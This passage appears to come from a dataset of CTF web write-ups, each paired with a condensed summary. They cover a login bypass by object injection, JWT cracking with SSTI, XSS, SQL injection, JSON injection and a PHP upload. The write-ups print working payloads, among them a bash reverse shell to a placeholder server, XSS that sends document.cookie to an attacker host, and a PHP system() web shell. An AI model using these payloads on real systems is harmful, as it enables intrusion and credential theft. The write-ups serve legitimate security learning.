  const con = DBCon(); // mysql.createConnection(...).connect()

  const sql = 'Select * from users where username = ? and password = ?';
  con.query(sql, [u, p], function(err, qResult) {
    if(err) {
      res.render('login', {error: `Unknown error: ${err}`});
    } else if(qResult.length) {
      const username = qResult[0]['username'];
      let flag;
      if(username.toLowerCase() == targetUser) {
        flag = flagValue
      } else{
        flag = ""<span class=text-danger>Only Michelle's account has the flag</span>"";
      }
      req.session.username = username
      req.session.flag = flag
      res.redirect('/me');
    } else {
      res.render('login', {error: ""Invalid username or password""})
    }
  });
});

/*
 * ...SNIP...
 */

```

# Exploitation

When you look at the source code, you'll notice the following snippet:

```js
app.use(bodyParser.urlencoded({
  extended: true
}))
```

This tells body parser to allow arrays and objects in the request body. So you can pass things like:

```
username[]=a&username[]=b

This is interpreted as username = ['a', 'b']

Similarly, 

username[hello]=a

Is interpreted as username = {hello: 'a'}
```

Now, you see in the `/login` POST route that the output has not been stringified (no `.toString()`). Which means it is possible to pass an object in the query statement.

```js
const sql = 'Select * from users where username = ? and password = ?';
con.query(sql, [u, p], function(err, qResult) {...});
```

Now, let's see if passing an objectto the `con.query` function might help us. We'll refer to the official `mysql` [docs](https://www.npmjs.com/package/mysql#escaping-query-values).

Take a look at this example:

```js
var post  = {id: 1, title: 'Hello MySQL'};
var query = connection.query('INSERT INTO posts SET ?', post, function (error, results, fields) {
  if (error) throw error;
  // Neat!
});
console.log(query.sql); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
```

We can see that objects are converted into comma separated attributes. We know that the username is supposed to be `michelle`, but we do not know the password. So, we can try to pass an object in the place of password, with a known attribute. Here's the payload I tried:

```
csrf&username=michelle&password[username]=michelle
```

This makes `password` an object as shown below:

```js
{
  username: 'michelle',
}
```

Now, the query becomes something like:

```js
con.query('Select * from users where username = ? and password = ?', ['michelle', {username: 'michelle'}], function(err, qResult) {...});
```

This actually evaluates to:

```js
""Select * from users where username = 'michelle' and password = `username` = 'michelle';""
```

This works because of the way `mysql` evaluates strings. When you evaluate `'password' = 'username'`, it returns a 0. Then, if you compare `0` and `'michelle'`, `true` is returned. This happens because of the way type-casting is done in `mysql`. 
<br />

This exploit would work for any string (not just `michelle`) except the ones which get type-casted to a different number.
<br />

For example, `0 = '1michelle'` will evaluate to false, since `1michelle` when converted to an integer gives `1`. Therefore, `password[username] = 1michelle` will not allow you to log in successfully. Check out [this](https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true) link for a more detailed explanation.
<br />

Here's the final paylaod.

```bash
curl -i -X POST --data 'csrf&username=michelle&password[username]=michelle' ""https://log-me-in.web.ctfcompetition.com/login""

HTTP/2 302 
content-type: text/plain; charset=utf-8
x-powered-by: Express
location: /me
vary: Accept
set-cookie: session=eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9; path=/; httponly
set-cookie: session.sig=bm5eHrmgRjBNmerS49mKNDV_tP4; path=/; httponly
x-cloud-trace-context: 51c2e656058a1cc31a265b3a8ad0d4b1
date: Mon, 24 Aug 2020 06:53:43 GMT
server: Google Frontend
content-length: 25

Found. Redirecting to /me
```

From here, you can just take the cookie you received, and use that to visit `/flag`.
<br />

P.S. you can write a python script for the exploit, like the one given below:

```py
import requests
import re

url = lambda path: 'https://log-me-in.web.ctfcompetition.com' + path

s = requests.Session()

payload = {
    ""username"": ""michelle"",
    ""password[username]"": ""michelle"",
    ""csrf"": """",
}

r = s.post(url('/login'), data=payload)

r = s.get(url('/flag'))

if re.search(r'CTF{.*}', r.text):
    print(r.text)

```

You can run this script and use `grep` to find the flag.

```bash
$ python solve.py | grep CTF
        <p>Flag: CTF{a-premium-effort-deserves-a-premium-flag}</p>
```

The flag is:

``` 
CTF{a-premium-effort-deserves-a-premium-flag}
```
","When you examine the source code, you'll notice the application uses `bodyParser.urlencoded` with `extended: true`. This allows arrays and objects to be passed in the request body. In the `/login` POST route, the output has not been stringified, so it is possible to pass an object in the query statement.
[JavaScript code: Configure bodyParser and create SQL query]

The exploit is to pass an object as the password parameter, with a known attribute. This causes the SQL query to be evaluated in a way that allows logging in without knowing the correct password. We'll refer to the official `mysql` docs for more information on how objects are converted into comma-separated attributes in SQL queries.

The final payload for this exploit is:
[HTTP POST request: Send payload with object as password]

From here, you can just take the cookie you received, and use that to visit `/flag`. Alternatively, you can use a Python script to automate the process:
[Python script: Send payload, get the flag, and print it]

You can run this script and use `grep` to find the flag.
"
"# Template Shack

Author: [roerohan](https://github.com/roerohan)

# Requirements

- JWT
- John The Ripper

# Source

```
Check out the coolest web templates online!

Connect here:
http://jh2i.com:50023
```

# Exploitation

When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. We used `rockyou.txt` to bruteforce the JWT secret, using John The Ripper.

```
$ john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

The secret is `supersecret`. Using this, you can make a JWT with `username: admin`.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H-_2q-Vo32g4mLpkEcajK0H7I
```

Now, add this to your cookie. You are logged in as admin. Visit some random route starting with `/admin/` which throws a 404. You can see there's scope for template injection in the 404 page.

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()%7D%7D
```

You can climb up the Python MRO using the `__class__` and `__bases__`, etc. This way you can find a list of all the classes you can use. On index 405, you see `subprocess.Popen`.

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405]%7D%7D
```

This shows `/template/admin/<class 'subprocess.Popen'>` on the website.

Now, you can use this to spawn a reverse shell. 

```
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405](['bash -c %22bash -i %3E& /dev/tcp/yourserverip/yourport 0%3E&1%22'], shell=True)%7D%7D
```

> Note: Replace yourserverip and yourport.

Start a `netcat` listener on your server at the specified port. 

You get a shell!

```
$ nc -lp 8000
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
user@272108e56147:~$ ls
ls
flag.txt
main.py
posts.py
requirements.txt
templates
user@272108e56147:~$ cat flag.txt
cat flag.txt
flag{easy_jinja_SSTI_RCE}
```

The flag is:

```
flag{easy_jinja_SSTI_RCE}
```","When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. The JWT secret was brute-forced using `rockyou.txt` and John The Ripper, which revealed the secret as `supersecret`. Using this secret, a JWT with `username: admin` was created and added to the cookie, logging in as admin.

Visiting a random route starting with `/admin/` that throws a 404 error, it was observed that there's scope for template injection in the 404 page. By climbing up the Python MRO using `__class__` and `__bases__`, etc., a list of all available classes was found. At index 405, the `subprocess.Popen` class was discovered.

Using this class, a reverse shell was spawned by sending a specially crafted URL. A netcat listener was started on the server at the specified port, which ultimately led to gaining a shell.

Upon listing the files and reading the content of `flag.txt`.
"
"# Agent 95

Author: [roerohan](https://github.com/roerohan)

As the name suggest, change the User Agent to Windows 95.

# Requirements

- Basic Knowledge of Request headers

# Source

- http://jh2i.com:50000.

```
They've given you a number, and taken away your name~

Connect here:
http://jh2i.com:50000
```

# Exploitation

The challenge is very simple once you know what to do. 

```
We will only give our flag to our Agent 95! He is still running an old version of Windows...
```

We assume Agent 95 uses Windows 95. So just change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.

```python
>>> import requests
>>> r = requests.get('http://jh2i.com:50000', headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)'})
>>> r.text
'flag{user_agents_undercover}\n<div style=""text-align:center"">\n<br><br><br><br>\n<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to Digital Ocean for supporting NahamCon and NahamCon CTF!\n<p>\n<img width=600px src=""https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/1b5a9739fd31b42fa4eb37ac6b3a6e1c.DOlogo.png"">\n</p>\n</div>'
```

There, you got the flag.

```
flag{user_agents_undercover}
```","The challenge is very simple once you know what to do.
This is the hint:
""We will only give our flag to our Agent 95! He is still running an old version of Windows...""

We assume Agent 95 uses Windows 95. So just change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.

We use a Python script:
[Python code: using `requests` to send a GET with the `User-Agent` header]

In the response, you got the flag.
"
"# Localghost

Author: [roerohan](https://github.com/roerohan)

Just check the local storage in your browser dev-tools.

# Requirements

- Browser Dev-Tools

# Source

- http://jh2i.com:50003

```
BooOooOooOOoo! This spooOoOooky client-side cooOoOode sure is scary! What spoOoOoOoky secrets does he have in stooOoOoOore??

Connect here:
http://jh2i.com:50003

Note, this flag is not in the usual format.
```

# Exploitation

Well, if you happen to look at the local storage, you'll get the flag directly. But that's not how we got it because we're stupid. So, here's what we did.
<br />

You see a JS file in the sources: `jquery.jscroll2.js`. Now, to understand what exactly it does, we first convert the huge list on `line 1` from `hex` to `string` to be able to make sense of it. So let's convert it using `python2`.

```python
random = [""\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74"",""\x6A\x73\x63\x72\x6F\x6C\x6C"",""\x3C\x73\x6D\x61\x6C\x6C\x3E\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E"",""\x61\x3A\x6C\x61\x73\x74"","""",""\x66\x6C\x61\x67"",""\x53\x6B\x4E\x55\x52\x6E\x74\x7A\x63\x47\x39\x76\x62\x32\x39\x76\x61\x33\x6C\x66\x5A\x32\x68\x76\x63\x33\x52\x7A\x58\x32\x6C\x75\x58\x33\x4E\x30\x62\x33\x4A\x68\x5A\x32\x56\x39"",""\x73\x65\x74\x49\x74\x65\x6D"",""\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65"",""\x64\x61\x74\x61"",""\x66\x75\x6E\x63\x74\x69\x6F\x6E"",""\x64\x65\x66\x61\x75\x6C\x74\x73"",""\x65\x78\x74\x65\x6E\x64"",""\x6F\x76\x65\x72\x66\x6C\x6F\x77\x2D\x79"",""\x63\x73\x73"",""\x76\x69\x73\x69\x62\x6C\x65"",""\x66\x69\x72\x73\x74"",""\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72"",""\x66\x69\x6E\x64"",""\x62\x6F\x64\x79"",""\x68\x72\x65\x66"",""\x61\x74\x74\x72"",""\x20"",""\x63\x6F\x6E\x74\x65\x6E\x74\x53\x65\x6C\x65\x63\x74\x6F\x72"",""\x74\x72\x69\x6D"",""\x73\x72\x63"",""\x69\x6D\x67"",""\x66\x69\x6C\x74\x65\x72"",""\x6C\x6F\x61\x64\x69\x6E\x67\x48\x74\x6D\x6C"",""\x6C\x65\x6E\x67\x74\x68"",""\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72"",""\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x22\x20\x2F\x3E"",""\x77\x72\x61\x70\x41\x6C\x6C"",""\x63\x6F\x6E\x74\x65\x6E\x74\x73"",""\x70\x61\x67\x69\x6E\x67\x53\x65\x6C\x65\x63\x74\x6F\x72"",""\x68\x69\x64\x65"",""\x63\x6C\x6F\x73\x65\x73\x74"",""\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74"",""\x61\x64\x64\x43\x6C\x61\x73\x73"",""\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72\x2C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64"",""\x6E\x6F\x74"",""\x70\x61\x72\x65\x6E\x74"",""\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74\x22\x20\x2F\x3E"",""\x77\x72\x61\x70"",""\x75\x6E\x77\x72\x61\x70"",""\x63\x68\x69\x6C\x64\x72\x65\x6E"",""\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64"",""\x72\x65\x6D\x6F\x76\x65\x44\x61\x74\x61"",""\x2E\x6A\x73\x63\x72\x6F\x6C\x6C"",""\x75\x6E\x62\x69\x6E\x64"",""\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x69\x6E\x6E\x65\x72"",""\x62\x6F\x72\x64\x65\x72\x54\x6F\x70\x57\x69\x64\x74\x68"",""\x70\x61\x64\x64\x69\x6E\x67\x54\x6F\x70"",""\x73\x63\x72\x6F\x6C\x6C\x54\x6F\x70"",""\x74\x6F\x70"",""\x6F\x66\x66\x73\x65\x74"",""\x68\x65\x69\x67\x68\x74"",""\x63\x65\x69\x6C"",""\x77\x61\x69\x74\x69\x6E\x67"",""\x70\x61\x64\x64\x69\x6E\x67"",""\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74"",""\x69\x6E\x66\x6F"",""\x6A\x53\x63\x72\x6F\x6C\x6C\x3A"",""\x66\x72\x6F\x6D\x20\x62\x6F\x74\x74\x6F\x6D\x2E\x20\x4C\x6F\x61\x64\x69\x6E\x67\x20\x6E\x65\x78\x74\x20\x72\x65\x71\x75\x65\x73\x74\x2E\x2E\x2E"",""\x6E\x65\x78\x74\x48\x72\x65\x66"",""\x77\x61\x72\x6E"",""\x6A\x53\x63\x72\x6F\x6C\x6C\x3A\x20\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72\x20\x6E\x6F\x74\x20\x66\x6F\x75\x6E\x64\x20\x2D\x20\x64\x65\x73\x74\x72\x6F\x79\x69\x6E\x67"",""\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72"",""\x61\x75\x74\x6F\x54\x72\x69\x67\x67\x65\x72\x55\x6E\x74\x69\x6C"",""\x73\x63\x72\x6F\x6C\x6C\x2E\x6A\x73\x63\x72\x6F\x6C\x6C"",""\x62\x69\x6E\x64"",""\x63\x6C\x69\x63\x6B\x2E\x6A\x73\x63\x72\x6F\x6C\x6C"",""\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E"",""\x3C\x2F\x64\x69\x76\x3E"",""\x68\x74\x6D\x6C"",""\x6C\x61\x73\x74"",""\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64\x22\x20\x2F\x3E"",""\x61\x70\x70\x65\x6E\x64"",""\x65\x72\x72\x6F\x72"",""\x72\x65\x6D\x6F\x76\x65"",""\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x6E\x65\x78\x74\x2D\x70\x61\x72\x65\x6E\x74"",""\x63\x61\x6C\x6C\x62\x61\x63\x6B"",""\x63\x61\x6C\x6C"",""\x64\x69\x72"",""\x6C\x6F\x61\x64"",""\x64\x69\x76\x2E\x6A\x73\x63\x72\x6F\x6C\x6C\x2D\x61\x64\x64\x65\x64"",""\x61\x6E\x69\x6D\x61\x74\x65"",""\x64\x65\x62\x75\x67"",""\x6F\x62\x6A\x65\x63\x74"",""\x61\x70\x70\x6C\x79"",""\x6C\x6F\x67"",""\x73\x6C\x69\x63\x65"",""\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"",""\x66\x6E"",""\x69\x6E\x69\x74\x69\x61\x6C\x69\x7A\x65\x64"",""\x65\x61\x63\x68""]

code = ''
for line in random:
    code +='\n'+ bytes(line)
print(code)
```

Once you run this script, you get a huge list, of which we'll display the first few items here.

```bash
$ python2 ~/Downloads/Dump/test.py

use strict
jscroll
<small>Loading...</small>
a:last

flag
SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9
setItem
localStorage
data
function
defaults
extend
```

Now we can try to make sense of the rest of the code. We see a line:

```javascript
window[_0xbcec[8]][_0xbcec[7]](_0xbcec[5], atob(_0xbcec[6]));
```

Now that we have the strings figured out, we can translate this to:

```javascript
window['localstorage']['setItem']('flag', atob('SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9'))
```

So the script basically converst the `base64` string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` and stores it in local storage with the key `flag`. Well, now you can just check the local storage, or just convert this string to ASCII using your terminal.

```bash
$ echo ""SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9"" | base64 -d
JCTF{spoooooky_ghosts_in_storage}
```

The flag is:

```
JCTF{spoooooky_ghosts_in_storage}
```","Well, if you happen to look at the local storage, you'll get the flag directly. But that's not how we got it because we're stupid. So, here's what we did.

You see a JS file in the sources: `jquery.jscroll2.js`. Now, to understand what exactly it does, we first convert the huge list on `line 1` from `hex` to `string` to be able to make sense of it. So let's convert it using a script written in `python2`.

Once you convert it, you will see some meaningful strings such as `localStorage`, `setItem`, `data`, `defaults`, `extend`, `function`, etc..
Now we can try to make sense of the rest of the code.

We see an interesting line. Now that we have the strings figured out:
[JavaScript code: stores the decoded base64 string in local storage with the key 'flag']

So the script basically converst the `base64` string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` and stores it in local storage with the key `flag`. Well, now you can just check the local storage, or just convert this string to ASCII using BASH.
"
"# inspector-general

Author: [roerohan](https://github.com/roerohan)

Basic source code challenge.

# Requirements

- Viewing source of HTML

# Source

- https://redpwn.net/

# Exploitation

Press `Ctrl + U` on your browser to view the source code of the `HTML` file. Search for `flag{...}`. 

```html
<meta name=""redpwnctf2020"" content=""flag{1nspector_g3n3ral_at_w0rk}"">
```

The flag is:

```
flag{1nspector_g3n3ral_at_w0rk}
```","Press `Ctrl + U` on your browser to view the source code of the `HTML` file. Search for `flag{...}`. 
[HTML source code with flag]
"
"# login

Author: [roerohan](https://github.com/roerohan)

Basic SQL Injection.

# Requirements

- Basic knowledge of SQL Injection.

# Source

- https://login.2020.redpwnc.tf/

# Exploitation

This is a beginner SQL Injection challenge. Just pass the username and the password as `' or 1=1 -- `, it will return the flag in an `alert`.

<img src=""./static/img1.png"" alt=""disas main"" width=""600""/>

The flag is:

```
flag{0bl1g4t0ry_5ql1}
```","This is a beginner SQL Injection challenge. To retrieve the flag, you need to inject a malicious SQL query into the login form.

Simply pass the username and the password as ' or 1=1 -- , which will be interpreted as a SQL query that always returns true, and comment out the rest of the query with the -- symbol. This will cause the server to execute the SQL query as if you had provided valid login credentials, resulting in an alert box displaying the flag.
"
"# panda-facts

Authors: [roerohan](https://github.com/roerohan), [thebongy](https://github.com/thebongy)

Maybe we can call this JSON injection?

# Requirements

- Basic knowledge of Node.js.

# Source

- [index.js](./index.js)
- https://panda-facts.2020.redpwnc.tf/

# Exploitation

```javascript
async function generateToken(username) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);

    const cipher = crypto.createCipheriv(algorithm, key, iv);

    const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`

    let encrypted = '';
    encrypted += cipher.update(token, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}
```

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:

```
const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`
```

This allows us to close the `""` with the help of the string we pass, and set member to a non-zero value.
<br />

We can just pass the username as `"",""member"":""1` and the visit `/api/flag`.

```
{
  ""success"": true,
  ""flag"": ""flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}""
}
```

The flag is:

```
flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}
```","[This challenge involves exploiting a vulnerability in the `generateToken` function in a JavaScript file. The function generates a token for a given `username`, where the `username` is included as a string in a JSON object that is encrypted using `aes-192-cbc`. However, the function forms the JSON object in a way that allows the "" character to be closed with the help of the string passed in the `username` parameter, and sets the `member` field to a non-zero value.]

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:
```
const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`
```

To exploit the vulnerability, we can pass the `username` as `"",""member"":""1` which will close the `""` character and set `member` to `1`. Then, we can visit `/api/flag` to get the flag in JSON format.
"
"# static-pastebin

Author: [roerohan](https://github.com/roerohan)

This challenge uses XSS to get the flag from the `admin bot's` cookies.

# Requirements

- Basic Knowledge of XSS.
- A web server where you can accept a request.

# Source

- https://static-pastebin.2020.redpwnc.tf/

# Exploitation

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin. You can see the `js` file in the page:

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

We can infer 2 things from this.

- The content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- The `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this clean function, by adding an extra `>` at the starting of your XSS script. Here's the payload:

```
><img src=1 href=1 onerror=""javascript:document.location='http://ip:port?cookie='+document.cookie""></img>
```

Your payload has the following URL:

```
https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9pcDpwb3J0P2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pbWc+
```

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot` [here](https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin&url=https%3A%2F%2Fstatic-pastebin.2020.redpwnc.tf%2Fpaste%2F%23PjxpbWcgc3JjPTEgaHJlZj0xIG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9jc2l2aXQuY29tOjkwMDE%2FY29va2llPScrZG9jdW1lbnQuY29va2llIj48L2ltZz4%3D&message=The%20admin%20has%20visited%20your%20URL.). The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:

```
GET /?cookie=flag=flag{54n1t1z4t10n_k1nd4_h4rd} HTTP/1.1
Host: ip:port
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
```

The flag is:

```
flag{54n1t1z4t10n_k1nd4_h4rd}
```","This challenge uses XSS to get the flag from the `admin bot's` cookies.

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin.

Inspecting the `js` file of the page we can can infer 2 things:
- the content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- the `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this `clean` function, by adding an extra `>` at the starting of your XSS script. Here's the payload:
[Payload for XSS attack with an extra "">"" at the beginning of the script]

Your payload has the following URL:
[URL with base64 encoded payload]

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot`. The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:
[HTTP GET request with the flag in the cookie]
"
"# static-static-hosting

Author: [roerohan](https://github.com/roerohan)

This is another XSS challenge, similar to [this](../static-pastebin) one.

# Requirements

- Basic knowledge of XSS.
- Server with SSL to accept a request.

# Source

- https://static-static-hosting.2020.redpwnc.tf/

# Exploitation

This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. Similar to [static-pastebin](../static-pastebin), the URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.documentElement.innerHTML = clean(input);
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload.

```
<iframe src=""javascript:document.location='https://myserver.tld?cookie='+document.cookie""></iframe>
````

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:

```
https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbXlzZXJ2ZXIudGxkP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pZnJhbWU+
```

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it.

```javascript
router.get('/cookie', (req, res) => {
	console.log(req.query.cookie);
}
```

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
<br />

The flag is:

```
flag{wh0_n33d5_d0mpur1fy}
```","This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. The URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload:
[Payload for XSS attack using an iframe and the 'src' attribute]

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:
[URL with base64 encoded payload]

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it. Here's an example of the backend code:
[Node.js code for a simple backend to log the stolen cookie]

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
"
"# Challenge Name

Author: [roerohan](https://github.com/roerohan)

Brief Description

# Requirements

- PHP Local File Inclusion (LFI)

# Source

- http://web.zh3r0.ml:7777/
- The description on the website mentions `page` and `upload`.

# Exploitation

The first part of the challenge is a sort of vague guesswork. In the challenge description, there are two words - `page` and `upload` - which the author wants you to notice. Also, when you view the homepage source, it has a comment `<!-- get the 'page' :eyes: -->`. 
<br />

<img src=""./static/img1.png"" alt=""comment"" width=""600""/>

So, the first try was to pass a query `page` in the flag. So, we tried to visit `http://web.zh3r0.ml:7777/?page=flag`. Here, we get a gif.
<br />

Now, since the description had the word `upload` in it, we tried to checkout if there is a page called upload, and there was!
<br />

<img src=""./static/img2.png"" alt=""upload"" width=""600""/>

Here, we can assume that we have to do some sort of local file inclusion. So we created a file called `payload.php`, and tried to `ls` the directory. We saw a lot of files called `flag`, so we just decided to print all files and just search on the browser. Here's the final payload:

```php
<?php
system('find . -type f -exec cat {} +');
?>
```

Now you can visit the route `/?page=payload` (name of the file you uploaded). This gives a page with a lot of stuff.
<br />

<img src=""./static/img3.png"" alt=""page"" width=""600""/>

So, the contents of all the files are now on the browser. All you have to do is open the source code and search for the flag format.
<br />

<img src=""./static/img4.png"" alt=""flag"" width=""600""/>

The flag is:

```
zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}
```
","The first part of the challenge is a sort of vague guesswork. In the challenge description, there are two words - `page` and `upload` - which the author wants you to notice. Also, when you view the homepage source, it has a comment `<!-- get the 'page' :eyes: -->`. 

So, the first try was to pass a query `page` in the flag. So, we tried to visit `?page=flag`. Here, we get a gif.

Now, since the description had the word `upload` in it, we tried to checkout if there is a page called upload, and there was!

Here, we can assume that we have to do some sort of local file inclusion. So we created a file called `payload.php`, and tried to `ls` the directory. We saw a lot of files called `flag`, so we just decided to print all files and just search on the browser.

Here's the final payload for the PHP code:
[PHP code payload for local file inclusion to find all files and print them]

Now you can visit the route `/?page=payload` (name of the file you uploaded). This gives a page with a lot of stuff.

So, the contents of all the files are now on the browser. All you have to do is open the source code and search for the flag format.
"
"# Java Code Analysis!?! #
 
## Overview ##
 
300 points
 
Category: [Web Exploitation](../)
 
Tags : `#picoCTF 2023` `Web Exploitation`
 
## Description ##
 
BookShelf Pico, my premium online book-reading service.
